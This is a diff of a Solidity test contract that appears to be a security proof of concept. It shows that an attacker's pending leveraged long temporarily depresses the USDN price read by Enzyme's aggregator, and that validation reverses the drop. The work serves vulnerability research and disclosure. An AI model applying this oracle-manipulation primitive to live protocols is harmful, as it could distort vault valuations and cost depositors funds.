@@ -5,27 +5,29 @@ pragma solidity 0.8.26;
 import { UsdnProtocolBaseFixture } from "../../unit/UsdnProtocol/utils/Fixtures.sol";
 import { IUsdnProtocolTypes } from "../../../src/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";
 
-/// @notice Proves that an unvalidated leveraged long temporarily changes USDN NAV when price moves,
-/// and that validateOpenPosition later cancels that temporary PnL.
+/// @notice Proves that a pending leveraged open changes the value returned by USDN_PROTOCOL.usdnPrice(currentPrice),
+/// exactly the view consumed by Enzyme's SmarDexUsdnNativeRateUsdAggregator, and that validation reverses the change.
 contract PendingOpenNavPoC is UsdnProtocolBaseFixture {
     address internal constant ATTACKER = address(0xBEEF);
 
     function setUp() public {
         params = DEFAULT_PARAMS;
-        // Keep the primitive isolated: funding/fees/rebase/limits are disabled by DEFAULT_PARAMS.
+        // Isolate the primitive: funding/fees/rebase/imbalance limits are disabled.
         params.initialLong = 5 ether;
         _setUp(params);
     }
 
     function test_pendingOpenProfitTemporarilyDepressesUsdnNavAndValidationRestoresIt() public {
         uint128 p0 = params.initialPrice; // $2,000
-        uint128 p1 = uint128(uint256(p0) * 105 / 100); // +5%
+        uint128 p1 = uint128(uint256(p0) * 105 / 100); // hypothetical current market price: +5%
 
-        uint256 navBefore = protocol.usdnPrice(p0);
-        uint256 vaultBefore = protocol.getBalanceVault();
+        // Pure negative control. usdnPrice() is a view, so this does not mutate Protocol state.
+        // It is also exactly the Protocol endpoint used by Enzyme's USDN price feed.
+        uint256 baselineNavAtP1 = protocol.usdnPrice(p1);
+        uint256 navAtP0 = protocol.usdnPrice(p0);
 
-        // Stop after INITIATE. USDN has already put the unvalidated position into global totalExpo
-        // and into the long/vault accounting at a temporary entry price of p0.
+        // Stop after INITIATE. The unvalidated position is already included in global totalExpo and balances
+        // at its temporary p0 entry price.
         IUsdnProtocolTypes.PositionId memory posId = setUpUserPositionInLong(
             OpenParams({
                 user: ATTACKER,
@@ -39,37 +41,48 @@ contract PendingOpenNavPoC is UsdnProtocolBaseFixture {
         (IUsdnProtocolTypes.Position memory pendingPos,) = protocol.getLongPosition(posId);
         assertFalse(pendingPos.validated, "position must still be pending");
 
-        // At the original price, inserting the pending long should not manufacture PnL.
+        // Critical observation: without any intervening state-changing liquidation/update, asking the same
+        // usdnPrice() view for current price p1 now prices the pending position's temporary profit against the vault.
+        // Enzyme's USDN aggregator performs this same view computation on every valuation.
+        uint256 navDuringPendingAtP1 = protocol.usdnPrice(p1);
         uint256 navAfterInitiateAtP0 = protocol.usdnPrice(p0);
 
-        // A normal permissionless state update at a higher price credits PnL to that temporary long.
-        // This moves value from the USDN vault side to the long side while the position is still unvalidated.
-        protocol.mockLiquidate(abi.encode(p1));
-        uint256 navDuringPending = protocol.usdnPrice(p1);
-        uint256 vaultDuringPending = protocol.getBalanceVault();
-
-        // Validate using the same p1. The production code explicitly cancels the PnL that the
-        // temporary pre-validation position accrued and adjusts vault/long balances accordingly.
+        // Validate at p1. Production USDN code explicitly cancels PnL accrued by the temporary pre-validation
+        // position and reprices the final position at the validation entry price.
         vm.prank(ATTACKER);
         (IUsdnProtocolTypes.LongActionOutcome outcome,) =
             protocol.validateOpenPosition(payable(ATTACKER), abi.encode(p1), EMPTY_PREVIOUS_DATA);
         assertEq(uint256(outcome), uint256(IUsdnProtocolTypes.LongActionOutcome.Processed), "open validation outcome");
 
-        uint256 navAfterValidation = protocol.usdnPrice(p1);
-        uint256 vaultAfterValidation = protocol.getBalanceVault();
+        uint256 navAfterValidationAtP1 = protocol.usdnPrice(p1);
 
-        emit log_named_uint("NAV_BEFORE_AT_P0", navBefore);
-        emit log_named_uint("NAV_AFTER_INITIATE_AT_P0", navAfterInitiateAtP0);
-        emit log_named_uint("NAV_DURING_PENDING_AT_P1", navDuringPending);
-        emit log_named_uint("NAV_AFTER_VALIDATION_AT_SAME_P1", navAfterValidation);
-        emit log_named_uint("VAULT_BEFORE", vaultBefore);
-        emit log_named_uint("VAULT_DURING_PENDING_AT_P1", vaultDuringPending);
-        emit log_named_uint("VAULT_AFTER_VALIDATION_AT_SAME_P1", vaultAfterValidation);
-        emit log_named_uint("REVERSIBLE_NAV_RECOVERY_BPS_OF_PENDING_NAV", (navAfterValidation - navDuringPending) * 10_000 / navDuringPending);
-        emit log_named_uint("REVERSIBLE_VAULT_RECOVERY", vaultAfterValidation - vaultDuringPending);
+        emit log_named_uint("NAV_AT_P0_BEFORE", navAtP0);
+        emit log_named_uint("BASELINE_NAV_AT_P1_WITHOUT_PENDING_OPEN", baselineNavAtP1);
+        emit log_named_uint("NAV_AT_P0_AFTER_INITIATE", navAfterInitiateAtP0);
+        emit log_named_uint("NAV_AT_P1_DURING_PENDING_OPEN", navDuringPendingAtP1);
+        emit log_named_uint("NAV_AT_P1_AFTER_VALIDATION", navAfterValidationAtP1);
+        emit log_named_uint(
+            "PENDING_OPEN_NAV_DEPRESSION_BPS",
+            (baselineNavAtP1 - navDuringPendingAtP1) * 10_000 / baselineNavAtP1
+        );
+        emit log_named_uint(
+            "VALIDATION_NAV_RECOVERY_BPS",
+            (navAfterValidationAtP1 - navDuringPendingAtP1) * 10_000 / navDuringPendingAtP1
+        );
 
-        assertApproxEqRel(navAfterInitiateAtP0, navBefore, 0.0001 ether, "initiate itself should not distort NAV at p0");
-        assertGt(navAfterValidation, navDuringPending, "same-price validation must reverse temporary NAV depression");
-        assertGt(vaultAfterValidation, vaultDuringPending, "same-price validation must return temporary value to vault");
+        // At the temporary entry price there is no artificial PnL.
+        assertApproxEqRel(navAfterInitiateAtP0, navAtP0, 0.0001 ether, "initiate should preserve NAV at p0");
+
+        // At p1, the unvalidated profitable long temporarily takes value from the vault/USDN price.
+        assertLt(navDuringPendingAtP1, baselineNavAtP1, "pending long must depress USDN NAV at p1");
+
+        // At the exact same p1, validation must reverse that temporary loss.
+        assertGt(navAfterValidationAtP1, navDuringPendingAtP1, "validation must restore temporary USDN NAV loss");
+        assertApproxEqRel(
+            navAfterValidationAtP1,
+            baselineNavAtP1,
+            0.0005 ether,
+            "after validation NAV should return to no-pending baseline within 5 bps"
+        );
     }
 }
